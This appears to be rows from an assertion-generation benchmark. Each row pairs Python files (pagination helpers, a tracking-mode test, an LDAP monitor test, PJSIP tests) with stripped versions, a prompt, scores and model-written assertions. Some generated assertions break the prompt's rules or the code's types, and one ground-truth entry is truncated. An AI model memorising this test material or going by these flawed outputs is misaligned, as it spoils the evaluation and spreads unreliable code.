37            pagination = PaginationRequest()
38        elif isinstance(pagination, dict):
39            page_size = int(pagination.get('page_size', DEFAULT_PAGE_SIZE))
40            pagination = PaginationRequest.create(
41                FIRST_PAGE + int(pagination.get('offset', 0)) // page_size,
42                page_size)
43        return pagination
44
45    @property
46    def record_count(self):
47        return self._record_count
48
49    @record_count.setter
50    def record_count(self, record_count):
51        self._record_count = record_count
52
53    @property
54    def page_size(self):
55        return self._page_size
56
57    @page_size.setter
58    def page_size(self, page_size):
59        # type: (int)->None
60        self._page_size = page_size
61
62    @property
63    def offset(self):
64        count = self._record_count
65        per_page = self.page_size
66        if self._offset >= count:
67            last_page_size = count % per_page
68            if last_page_size == 0:
69                last_page_size = per_page
70            self._offset = count - last_page_size
71        if self._offset < 0:
72            self._offset = 0
73
74        return self._offset
75
76    @offset.setter
77    def offset(self, offset):
78        # type:(int)->None
79        self._offset = offset
80
81    def apply_pagination(self, q):
82        # type: (Query)->Query
83        """"""
84        Filters the query so that a given page is returned. The record count
85        must be set in advance.
86        :param q: Query to be paged.
87        :return: Paged query.
88        """"""
89        return q.limit(self.page_size).offset(self.offset)
90
91    def paginate(self, q):
92        # type: (Query)->Query
93        """"""
94        Filters the query so that a given page is returned. The record count
95        is computed automatically from query.
96        :param q: Query to be paged.
97        :return: Paged query.
98        """"""
99        self.record_count = q.count()
100        return self.apply_pagination(q).all()
101
102
103class PaginationRequest(AppModel):
104    def __init__(self, raw=None, id_name='id', hints=None):
105        if raw is None:
106            raw = {'page_no': FIRST_PAGE, 'page_size': DEFAULT_PAGE_SIZE}
107
108        super(PaginationRequest, self).__init__(raw, id_name, hints)
109        self.page_no = int(self.page_no) if self.page_no else FIRST_PAGE
110        self.page_size = int(self.page_size) if self.page_size else DEFAULT_PAGE_SIZE
111
112    @staticmethod
113    def create(page_no: int = FIRST_PAGE, page_size: int = DEFAULT_PAGE_SIZE) -> 'PaginationRequest':
114        return PaginationRequest({'page_no': page_no, 'page_size': page_size})
115
116
117class PaginationResponse(AppModel):
118    def __init__(self, record_count, page_size, pagination):
119        # type: (int, int, PaginationRequest)->None
120        super(PaginationResponse, self).__init__({})
121        self.record_count = record_count
122        max_page_size = pagination.page_size
123        self.page_count = (record_count + max_page_size - 1) // max_page_size
124        self.page_size = page_size
125        self.max_page_size = max_page_size
126        self.page_no = pagination.page_no
127","[['self.record_count', '>=', '0']]",2,1,0.5,0.0002322340919647,"['FIRST_PAGE', 'DEFAULT_PAGE_SIZE', 'pagination', 'self._offset', 'self._page_size', 'self._record_count', 'page_size', 'record_count', 'count', 'per_page', 'last_page_size', 'offset', 'q', 'self.record_count', 'raw', 'id_name', 'hints', 'self.page_no', 'self.page_size', 'page_no: int', 'page_size: int', 'max_page_size', 'self.page_count', 'self.max_page_size']",24,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['FIRST_PAGE', 'DEFAULT_PAGE_SIZE', 'pagination', 'self._offset', 'self._page_size', 'self._record_count', 'page_size', 'record_count', 'count', 'per_page', 'last_page_size', 'offset', 'q', 'self.record_count', 'raw', 'id_name', 'hints', 'self.page_no', 'self.page_size', 'page_no: int', 'page_size: int', 'max_page_size', 'self.page_count', 'self.max_page_size']
*Code:

1""""""
2:mod:`zsl.db.helpers.pagination`
3--------------------------------
4""""""
5from __future__ import unicode_literals
6
7from builtins import object
8from typing import Dict, Union
9
10from sqlalchemy.orm.query import Query
11
12from zsl.db.model.app_model import AppModel
13
14FIRST_PAGE = 1
15DEFAULT_PAGE_SIZE = 25
16
17
18class Pagination(object):
19    """"""
20    Pagination support. Allows to paginate a query. There are two choices.
21      #. :meth:`.paginate` - paginates a query and obtains the count
22         automatically.
23      #. :meth:`.apply_pagination` - paginates a query and assumes that
24         record count is set in advance.
25    """"""
26
27    def __init__(self, pagination=None):
28        # type: (Union[PaginationRequest, Dict[str, Union[str, int]], None])->None
29        pagination = self._create_pagination_request(pagination)
30        self._offset = (pagination.page_no - FIRST_PAGE) * pagination.page_size
31        self._page_size = pagination.page_size
32        self._record_count = -1
33
34    def _create_pagination_request(self, pagination):
35        # type: (Union[PaginationRequest, Dict[str, Union[str, int]], None])->PaginationRequest
36        if pagination is None:
37            pagination = PaginationRequest()
38        elif isinstance(pagination, dict):
39            page_size = int(pagination.get('page_size', DEFAULT_PAGE_SIZE))
40            pagination = PaginationRequest.create(
41                FIRST_PAGE + int(pagination.get('offset', 0)) // page_size,
42                page_size)
43        return pagination
44
45    @property
46    def record_count(self):
47        return self._record_count
48
49    @record_count.setter
50    def record_count(self, record_count):
51        self._record_count = record_count
52
53    @property
54    def page_size(self):
55        return self._page_size
56
57    @page_size.setter
58    def page_size(self, page_size):
59        # type: (int)->None
60        self._page_size = page_size
61
62    @property
63    def offset(self):
64        count = self._record_count
65        per_page = self.page_size
66        if self._offset >= count:
67            last_page_size = count % per_page
68            if last_page_size == 0:
69                last_page_size = per_page
70            self._offset = count - last_page_size
71        if self._offset < 0:
72            self._offset = 0
73
74        return self._offset
75
76    @offset.setter
77    def offset(self, offset):
78        # type:(int)->None
79        self._offset = offset
80
81    def apply_pagination(self, q):
82        # type: (Query)->Query
83        """"""
84        Filters the query so that a given page is returned. The record count
85        must be set in advance.
86        :param q: Query to be paged.
87        :return: Paged query.
88        """"""
89        return q.limit(self.page_size).offset(self.offset)
90
91    def paginate(self, q):
92        # type: (Query)->Query
93        """"""
94        Filters the query so that a given page is returned. The record count
95        is computed automatically from query.
96        :param q: Query to be paged.
97        :return: Paged query.
98        """"""
99        self.record_count = q.count()
100        return self.apply_pagination(q).all()
101
102
103class PaginationRequest(AppModel):
104    def __init__(self, raw=None, id_name='id', hints=None):
105        if raw is None:
106            raw = {'page_no': FIRST_PAGE, 'page_size': DEFAULT_PAGE_SIZE}
107
108        super(PaginationRequest, self).__init__(raw, id_name, hints)
109        self.page_no = int(self.page_no) if self.page_no else FIRST_PAGE
110        self.page_size = int(self.page_size) if self.page_size else DEFAULT_PAGE_SIZE
111
112    @staticmethod
113    def create(page_no: int = FIRST_PAGE, page_size: int = DEFAULT_PAGE_SIZE) -> 'PaginationRequest':
114        return PaginationRequest({'page_no': page_no, 'page_size': page_size})
115
116
117class PaginationResponse(AppModel):
118    def __init__(self, record_count, page_size, pagination):
119        # type: (int, int, PaginationRequest)->None
120        super(PaginationResponse, self).__init__({})
121        self.record_count = record_count
122        max_page_size = pagination.page_size
123        self.page_count = (record_count + max_page_size - 1) // max_page_size
124        self.page_size = page_size
125        self.max_page_size = max_page_size
126        self.page_no = pagination.page_no
127",6199,"[[14, 'FIRST_PAGE', '==', 1, ""first_page should always be 1 in a pagination""],
 [15, 'DEFAULT_PAGE_SIZE', '>=', 1, ""default page size should be at least 1""],
 [28, 'pagination', '!=', None, ""pagination object should not be None after initialization""],
 [30, 'self._offset', '>=', 0, ""offset must always be zero or positive""],
 [31, 'self._page_size', '>=', 1, ""page size must always be at least one""],
 [32, 'self._record_count', '==', -1, ""record count is -1 initialise beforehand calculation""],
 [39, 'page_size', '>=', 1, ""page_size should be at least 1""],
 [43, 'pagination', '!=', None, ""pagination object should not be None after initialization""],
 [50, 'record_count', '>=', 0, ""record count should be zero or positive""],
 [58, 'page_size', '>=', 1, ""Page size should be at least 1""],
 [66, 'self._offset', '>=', 0, ""offset must always be zero or positive""],
 [67, 'last_page_size', '>=', 0, ""last_page_size must always be zero or positive""],
 [70, 'self._offset', '>=', 0, ""offset must always be zero or positive""],
 [77, 'offset', '>=', 0, ""offset must always be zero or positive""],
 [109, 'self.page_no', '>=', 1, ""page number should be at least 1""],
 [110, 'self.page_size', '>=', 1, ""page size should be at least 1""],
 [119, 'record_count', '>=', 0, ""record count should be zero or positive""],
 [120, 'page_size', '>=', 1, ""Page size should be at least 1""],
 [122, 'max_page_size', '>=', 1, ""Max page size should be at least 1""],
 [123, 'self.page_count', '>=', 0, ""page count should be zero or positive""],
 [125, 'self.max_page_size', '>=', 1, ""Max page size should be at least 1""],
 [126, 'self.page_no', '>=', 1, ""Page number should be at least 1""]]"
lsst-sqre/ltd-keeper,"""""""Test the manual tracking mode.""""""

from __future__ import annotations

from keeper.editiontracking.trackingmodes import EditionTrackingModes


def test_manual_mode() -> None:
    """"""Test the ManualTrackingMode.""""""
    modes = EditionTrackingModes()

    mode = modes[""manual""]

    assert mode.name == ""manual""

    # Never returns True, by definition
    assert mode.should_update(None, None) is False
","
1""""""Test the manual tracking mode.""""""
2
3from __future__ import annotations
4
5from keeper.editiontracking.trackingmodes import EditionTrackingModes
6
7
8def test_manual_mode() -> None:
9    """"""Test the ManualTrackingMode.""""""
10    modes = EditionTrackingModes()
11
12    mode = modes[""manual""]
13
14
15    # Never returns True, by definition
16","[['mode.name', '==', '""manual""'], ['mode.should_update(None', '==', 'True']]",2,2,1.0,0.0049261083743842,"['modes', 'mode']",2,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['modes', 'mode']
*Code:

1""""""Test the manual tracking mode.""""""
2
3from __future__ import annotations
4
5from keeper.editiontracking.trackingmodes import EditionTrackingModes
6
7
8def test_manual_mode() -> None:
9    """"""Test the ManualTrackingMode.""""""
10    modes = EditionTrackingModes()
11
12    mode = modes[""manual""]
13
14
15    # Never returns True, by definition
16",1743,"[[10, 'modes', '!=', None, ""modes should not be None""],
 [12, 'mode', '!=', None, ""mode should not be None""]]"
gonicus/gosa,"# This file is part of the GOsa project.
#
#  http://gosa-project.org
#
# Copyright:
#  (C) 2016 GONICUS GmbH, Germany, http://www.gonicus.de
#
# See the LICENSE file in the project's top-level directory for details.
from base64 import b64encode
from unittest import mock, TestCase

from gosa.utils.gosa_ldap_monitor import *


class LdapMonitorTestCase(TestCase):

    def test_main(self):

        lines = [
            ""dn: base"",
            ""changetype: modify"",
            ""modifiersName: other"",
            ""modifyTimestamp: %s"" % datetime.now().strftime(""%Y%m%d%H%M%SZ""),
            """"
        ]
        env = Environment.getInstance()
        webhook_target = env.config.get('backend-monitor.webhook-target', default='http://localhost:8000/hooks/')
        token = bytes(env.config.get('backend-monitor.webhook-token'), 'ascii')
        m_open = mock.mock_open()
        with mock.patch(""gosa.utils.gosa_ldap_monitor.open"", m_open, create=True),\
                mock.patch(""gosa.utils.gosa_ldap_monitor.tail"", return_value=lines) as m_tail,\
                mock.patch(""gosa.utils.gosa_ldap_monitor.requests.post"") as m_post:
            monitor('/tmp/audit.log', 'other', token, webhook_target)
            assert not m_post.called

            monitor('/tmp/audit.log', 'gosa-backend', token, webhook_target)
            assert m_post.called

            m_post.reset_mock()
            m_tail.return_value = [
                ""dn::%s"" % b64encode(b""base""),
                ""changetype:modify"",
                ""modifiersName:other"",
                """"
            ]
            monitor('/tmp/audit.log', 'gosa-backend', token, webhook_target)
            assert m_post.called","
1# This file is part of the GOsa project.
2#
3#  http://gosa-project.org
4#
5# Copyright:
6#  (C) 2016 GONICUS GmbH, Germany, http://www.gonicus.de
7#
8# See the LICENSE file in the project's top-level directory for details.
9from base64 import b64encode
10from unittest import mock, TestCase
11
12from gosa.utils.gosa_ldap_monitor import *
13
14
15class LdapMonitorTestCase(TestCase):
16
17    def test_main(self):
18
19        lines = [
20            ""dn: base"",
21            ""changetype: modify"",
22            ""modifiersName: other"",
23            ""modifyTimestamp: %s"" % datetime.now().strftime(""%Y%m%d%H%M%SZ""),
24            """"
25        ]
26        env = Environment.getInstance()
27        webhook_target = env.config.get('backend-monitor.webhook-target', default='http://localhost:8000/hooks/')
28        token = bytes(env.config.get('backend-monitor.webhook-token'), 'ascii')
29        m_open = mock.mock_open()
30        with mock.patch(""gosa.utils.gosa_ldap_monitor.open"", m_open, create=True),\
31                mock.patch(""gosa.utils.gosa_ldap_monitor.tail"", return_value=lines) as m_tail,\
32                mock.patch(""gosa.utils.gosa_ldap_monitor.requests.post"") as m_post:
33            monitor('/tmp/audit.log', 'other', token, webhook_target)
34
35            monitor('/tmp/audit.log', 'gosa-backend', token, webhook_target)
36
37            m_post.reset_mock()
38            m_tail.return_value = [
39                ""dn::%s"" % b64encode(b""base""),
40                ""changetype:modify"",
41                ""modifiersName:other"",
42                """"
43            ]
44            monitor('/tmp/audit.log', 'gosa-backend', token, webhook_target)","[['m_post.called', '==', 'False'], ['m_post.called', '==', 'True'], ['m_post.called', '==', 'True']]",3,3,1.0,0.0017740981667652,"['lines', 'env', 'webhook_target', 'token', 'm_open', 'm_tail.return_value']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['lines', 'env', 'webhook_target', 'token', 'm_open', 'm_tail.return_value']
*Code:

1# This file is part of the GOsa project.
2#
3#  http://gosa-project.org
4#
5# Copyright:
6#  (C) 2016 GONICUS GmbH, Germany, http://www.gonicus.de
7#
8# See the LICENSE file in the project's top-level directory for details.
9from base64 import b64encode
10from unittest import mock, TestCase
11
12from gosa.utils.gosa_ldap_monitor import *
13
14
15class LdapMonitorTestCase(TestCase):
16
17    def test_main(self):
18
19        lines = [
20            ""dn: base"",
21            ""changetype: modify"",
22            ""modifiersName: other"",
23            ""modifyTimestamp: %s"" % datetime.now().strftime(""%Y%m%d%H%M%SZ""),
24            """"
25        ]
26        env = Environment.getInstance()
27        webhook_target = env.config.get('backend-monitor.webhook-target', default='http://localhost:8000/hooks/')
28        token = bytes(env.config.get('backend-monitor.webhook-token'), 'ascii')
29        m_open = mock.mock_open()
30        with mock.patch(""gosa.utils.gosa_ldap_monitor.open"", m_open, create=True),\
31                mock.patch(""gosa.utils.gosa_ldap_monitor.tail"", return_value=lines) as m_tail,\
32                mock.patch(""gosa.utils.gosa_ldap_monitor.requests.post"") as m_post:
33            monitor('/tmp/audit.log', 'other', token, webhook_target)
34
35            monitor('/tmp/audit.log', 'gosa-backend', token, webhook_target)
36
37            m_post.reset_mock()
38            m_tail.return_value = [
39                ""dn::%s"" % b64encode(b""base""),
40                ""changetype:modify"",
41                ""modifiersName:other"",
42                """"
43            ]
44            monitor('/tmp/audit.log', 'gosa-backend', token, webhook_target)",3124,"[19, 'lines', '==', 5, 'The number of lines should always be 5'], 
[27, 'webhook_target', '!=', '', 'webhook_target variable should not be an empty string'], 
[28, 'token', '!=', '', 'token variable should not be an empty string'], 
[29, 'm_open', '!=', None, 'm_open should not be none'], 
[38, 'm_tail.return_value', '==', 4, 'The length of m_tail.return_value should be 4']"
pol51/PJSIP-CMake,"import pjsua2 as pj
import sys
import time

#
# Basic data structure test, to make sure basic struct
# and array operations work
#
def ua_data_test():
	#
	# AuthCredInfo
	#
	print ""UA data types test..""
	the_realm = ""pjsip.org""
	ci = pj.AuthCredInfo()
	ci.realm = the_realm
	ci.dataType = 20
	
	ci2 = ci
	assert ci.dataType == 20
	assert ci2.realm == the_realm
	
	#
	# UaConfig
	# See here how we manipulate std::vector
	#
	uc = pj.UaConfig()
	uc.maxCalls = 10
	uc.userAgent = ""Python""
	uc.nameserver = pj.StringVector([""10.0.0.1"", ""10.0.0.2""])
	uc.nameserver.append(""NS1"")
	
	uc2 = uc
	assert uc2.maxCalls == 10
	assert uc2.userAgent == ""Python""
	assert len(uc2.nameserver) == 3
	assert uc2.nameserver[0] == ""10.0.0.1""
	assert uc2.nameserver[1] == ""10.0.0.2""
	assert uc2.nameserver[2] == ""NS1""

	print ""  Dumping nameservers: "",
	for s in uc2.nameserver:
		print s,
	print """"

#
# Exception test
#
def ua_run_test_exception():
	print ""Exception test..""
	ep = pj.Endpoint()
	ep.libCreate()
	got_exception = False
	try:
		ep.natDetectType()
	except pj.Error, e:
		got_exception = True
		print ""  Got exception: status=%u, reason=%s,\n  title=%s,\n  srcFile=%s, srcLine=%d"" % \
			(e.status, e.reason, e.title, e.srcFile, e.srcLine)
		assert e.status == 370050
		assert e.reason.find(""PJNATH_ESTUNINSERVER"") >= 0
		assert e.title == ""pjsua_detect_nat_type()""
	assert got_exception

#
# Custom log writer
#
class MyLogWriter(pj.LogWriter):
	def write(self, entry):
		print ""This is Python:"", entry.msg
		
#
# Testing log writer callback
#
def ua_run_log_test():
	print ""Logging test..""
	ep_cfg = pj.EpConfig()
	
	lw = MyLogWriter()
	ep_cfg.logConfig.writer = lw
	ep_cfg.logConfig.decor = ep_cfg.logConfig.decor & ~(pj.PJ_LOG_HAS_CR | pj.PJ_LOG_HAS_NEWLINE) 
	
	ep = pj.Endpoint()
	ep.libCreate()
	ep.libInit(ep_cfg)
	ep.libDestroy()
	
#
# Simple create, init, start, and destroy sequence
#
def ua_run_ua_test():
	print ""UA test run..""
	ep_cfg = pj.EpConfig()
	
	ep = pj.Endpoint()
	ep.libCreate()
	ep.libInit(ep_cfg)
	ep.libStart()
	
	print ""************* Endpoint started ok, now shutting down... *************""
	ep.libDestroy()

#
# Tone generator
#
def ua_tonegen_test():
        print ""UA tonegen test..""
        ep_cfg = pj.EpConfig()

        ep = pj.Endpoint()
        ep.libCreate()
        ep.libInit(ep_cfg)
        ep.libStart()
        
        tonegen = pj.ToneGenerator()
        tonegen.createToneGenerator()

        tone = pj.ToneDesc()
        tone.freq1 = 400
        tone.freq2 = 600
        tone.on_msec = 1000
        tone.off_msec = 1000
        tones = pj.ToneDescVector()
        tones.append(tone)

        digit = pj.ToneDigit()
        digit.digit = '0'
        digit.on_msec = 1000
        digit.off_msec = 1000
        digits = pj.ToneDigitVector()
        digits.append(digit)

        adm = ep.audDevManager()
        spk = adm.getPlaybackDevMedia()

        tonegen.play(tones, True)
        tonegen.startTransmit(spk)
        time.sleep(5)

	tonegen.stop()
        tonegen.playDigits(digits, True)
        time.sleep(5)

	dm = tonegen.getDigitMap()
	print dm[0].digit
	dm[0].freq1 = 400
	dm[0].freq2 = 600
	tonegen.setDigitMap(dm)
	
	tonegen.stop()
        tonegen.playDigits(digits, True)
        time.sleep(5)
	
        tonegen = None

        ep.libDestroy()

#
# main()
#
if __name__ == ""__main__"":
	ua_data_test()
	ua_run_test_exception()
	ua_run_log_test()
	ua_run_ua_test()
	ua_tonegen_test()
	sys.exit(0)

	
","
1import pjsua2 as pj
2import sys
3import time
4
5#
6# Basic data structure test, to make sure basic struct
7# and array operations work
8#
9def ua_data_test():
10	#
11	# AuthCredInfo
12	#
13	print ""UA data types test..""
14	the_realm = ""pjsip.org""
15	ci = pj.AuthCredInfo()
16	ci.realm = the_realm
17	ci.dataType = 20
18	
19	ci2 = ci
20	
21	#
22	# UaConfig
23	# See here how we manipulate std::vector
24	#
25	uc = pj.UaConfig()
26	uc.maxCalls = 10
27	uc.userAgent = ""Python""
28	uc.nameserver = pj.StringVector([""10.0.0.1"", ""10.0.0.2""])
29	uc.nameserver.append(""NS1"")
30	
31	uc2 = uc
32
33	print ""  Dumping nameservers: "",
34	for s in uc2.nameserver:
35		print s,
36	print """"
37
38#
39# Exception test
40#
41def ua_run_test_exception():
42	print ""Exception test..""
43	ep = pj.Endpoint()
44	ep.libCreate()
45	got_exception = False
46	try:
47		ep.natDetectType()
48	except pj.Error, e:
49		got_exception = True
50		print ""  Got exception: status=%u, reason=%s,\n  title=%s,\n  srcFile=%s, srcLine=%d"" % \
51			(e.status, e.reason, e.title, e.srcFile, e.srcLine)
52
53#
54# Custom log writer
55#
56class MyLogWriter(pj.LogWriter):
57	def write(self, entry):
58		print ""This is Python:"", entry.msg
59		
60#
61# Testing log writer callback
62#
63def ua_run_log_test():
64	print ""Logging test..""
65	ep_cfg = pj.EpConfig()
66	
67	lw = MyLogWriter()
68	ep_cfg.logConfig.writer = lw
69	ep_cfg.logConfig.decor = ep_cfg.logConfig.decor & ~(pj.PJ_LOG_HAS_CR | pj.PJ_LOG_HAS_NEWLINE) 
70	
71	ep = pj.Endpoint()
72	ep.libCreate()
73	ep.libInit(ep_cfg)
74	ep.libDestroy()
75	
76#
77# Simple create, init, start, and destroy sequence
78#
79def ua_run_ua_test():
80	print ""UA test run..""
81	ep_cfg = pj.EpConfig()
82	
83	ep = pj.Endpoint()
84	ep.libCreate()
85	ep.libInit(ep_cfg)
86	ep.libStart()
87	
88	print ""************* Endpoint started ok, now shutting down... *************""
89	ep.libDestroy()
90
91#
92# Tone generator
93#
94def ua_tonegen_test():
95        print ""UA tonegen test..""
96        ep_cfg = pj.EpConfig()
97
98        ep = pj.Endpoint()
99        ep.libCreate()
100        ep.libInit(ep_cfg)
101        ep.libStart()
102        
103        tonegen = pj.ToneGenerator()
104        tonegen.createToneGenerator()
105
106        tone = pj.ToneDesc()
107        tone.freq1 = 400
108        tone.freq2 = 600
109        tone.on_msec = 1000
110        tone.off_msec = 1000
111        tones = pj.ToneDescVector()
112        tones.append(tone)
113
114        digit = pj.ToneDigit()
115        digit.digit = '0'
116        digit.on_msec = 1000
117        digit.off_msec = 1000
118        digits = pj.ToneDigitVector()
119        digits.append(digit)
120
121        adm = ep.audDevManager()
122        spk = adm.getPlaybackDevMedia()
123
124        tonegen.play(tones, True)
125        tonegen.startTransmit(spk)
126        time.sleep(5)
127
128	tonegen.stop()
129        tonegen.playDigits(digits, True)
130        time.sleep(5)
131
132	dm = tonegen.getDigitMap()
133	print dm[0].digit
134	dm[0].freq1 = 400
135	dm[0].freq2 = 600
136	tonegen.setDigitMap(dm)
137	
138	tonegen.stop()
139        tonegen.playDigits(digits, True)
140        time.sleep(5)
141	
142        tonegen = None
143
144        ep.libDestroy()
145
146#
147# main()
148#
149if __name__ == ""__main__"":
150	ua_data_test()
151	ua_run_test_exception()
152	ua_run_log_test()
153	ua_run_ua_test()
154	ua_tonegen_test()
155	sys.exit(0)
156
157	
158","[['ci.dataType', '==', '20'], ['ci2.realm', '==', 'the_realm'], ['uc2.maxCalls', '==', '10'], ['uc2.userAgent', '==', '""Python""'], ['len(uc2.nameserver)', '==', '3'], ['uc2.nameserver[0]', '==', '""10.0.0.1""'], ['uc2.nameserver[1]', '==', '""10.0.0.2""'], ['uc2.nameserver[2]', '==', '""NS1""'], ['e.status', '==', '370050'], ['e.reason.find(""PJNATH_ESTUNINSERVER"")', '>=', '0'], ['e.title', '==', '""pjsua_detect_nat_type()""'], ['got_exception', '==', 'True']]",12,12,1.0,0.0034812880765883,"['the_realm', 'ci', 'ci.realm', 'ci.dataType', 'ci2', 'uc', 'uc.maxCalls', 'uc.userAgent', 'uc.nameserver', 'uc2', 'ep', 'got_exception', 'entry', 'ep_cfg', 'lw', 'ep_cfg.logConfig.writer', 'ep_cfg.logConfig.decor', 'tonegen', 'tone', 'tone.freq1', 'tone.freq2', 'tone.on_msec', 'tone.off_msec', 'tones', 'digit', 'digit.digit', 'digit.on_msec', 'digit.off_msec', 'digits', 'adm', 'spk', 'dm', 'dm[0].freq1', 'dm[0].freq2']",34,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['the_realm', 'ci', 'ci.realm', 'ci.dataType', 'ci2', 'uc', 'uc.maxCalls', 'uc.userAgent', 'uc.nameserver', 'uc2', 'ep', 'got_exception', 'entry', 'ep_cfg', 'lw', 'ep_cfg.logConfig.writer', 'ep_cfg.logConfig.decor', 'tonegen', 'tone', 'tone.freq1', 'tone.freq2', 'tone.on_msec', 'tone.off_msec', 'tones', 'digit', 'digit.digit', 'digit.on_msec', 'digit.off_msec', 'digits', 'adm', 'spk', 'dm', 'dm[0].freq1', 'dm[0].freq2']
*Code:

1import pjsua2 as pj
2import sys
3import time
4
5#
6# Basic data structure test, to make sure basic struct
7# and array operations work
8#
9def ua_data_test():
10	#
11	# AuthCredInfo
12	#
13	print ""UA data types test..""
14	the_realm = ""pjsip.org""
15	ci = pj.AuthCredInfo()
16	ci.realm = the_realm
17	ci.dataType = 20
18	
19	ci2 = ci
20	
21	#
22	# UaConfig
23	# See here how we manipulate std::vector
24	#
25	uc = pj.UaConfig()
26	uc.maxCalls = 10
27	uc.userAgent = ""Python""
28	uc.nameserver = pj.StringVector([""10.0.0.1"", ""10.0.0.2""])
29	uc.nameserver.append(""NS1"")
30	
31	uc2 = uc
32
33	print ""  Dumping nameservers: "",
34	for s in uc2.nameserver:
35		print s,
36	print """"
37
38#
39# Exception test
40#
41def ua_run_test_exception():
42	print ""Exception test..""
43	ep = pj.Endpoint()
44	ep.libCreate()
45	got_exception = False
46	try:
47		ep.natDetectType()
48	except pj.Error, e:
49		got_exception = True
50		print ""  Got exception: status=%u, reason=%s,\n  title=%s,\n  srcFile=%s, srcLine=%d"" % \
51			(e.status, e.reason, e.title, e.srcFile, e.srcLine)
52
53#
54# Custom log writer
55#
56class MyLogWriter(pj.LogWriter):
57	def write(self, entry):
58		print ""This is Python:"", entry.msg
59		
60#
61# Testing log writer callback
62#
63def ua_run_log_test():
64	print ""Logging test..""
65	ep_cfg = pj.EpConfig()
66	
67	lw = MyLogWriter()
68	ep_cfg.logConfig.writer = lw
69	ep_cfg.logConfig.decor = ep_cfg.logConfig.decor & ~(pj.PJ_LOG_HAS_CR | pj.PJ_LOG_HAS_NEWLINE) 
70	
71	ep = pj.Endpoint()
72	ep.libCreate()
73	ep.libInit(ep_cfg)
74	ep.libDestroy()
75	
76#
77# Simple create, init, start, and destroy sequence
78#
79def ua_run_ua_test():
80	print ""UA test run..""
81	ep_cfg = pj.EpConfig()
82	
83	ep = pj.Endpoint()
84	ep.libCreate()
85	ep.libInit(ep_cfg)
86	ep.libStart()
87	
88	print ""************* Endpoint started ok, now shutting down... *************""
89	ep.libDestroy()
90
91#
92# Tone generator
93#
94def ua_tonegen_test():
95        print ""UA tonegen test..""
96        ep_cfg = pj.EpConfig()
97
98        ep = pj.Endpoint()
99        ep.libCreate()
100        ep.libInit(ep_cfg)
101        ep.libStart()
102        
103        tonegen = pj.ToneGenerator()
104        tonegen.createToneGenerator()
105
106        tone = pj.ToneDesc()
107        tone.freq1 = 400
108        tone.freq2 = 600
109        tone.on_msec = 1000
110        tone.off_msec = 1000
111        tones = pj.ToneDescVector()
112        tones.append(tone)
113
114        digit = pj.ToneDigit()
115        digit.digit = '0'
116        digit.on_msec = 1000
117        digit.off_msec = 1000
118        digits = pj.ToneDigitVector()
119        digits.append(digit)
120
121        adm = ep.audDevManager()
122        spk = adm.getPlaybackDevMedia()
123
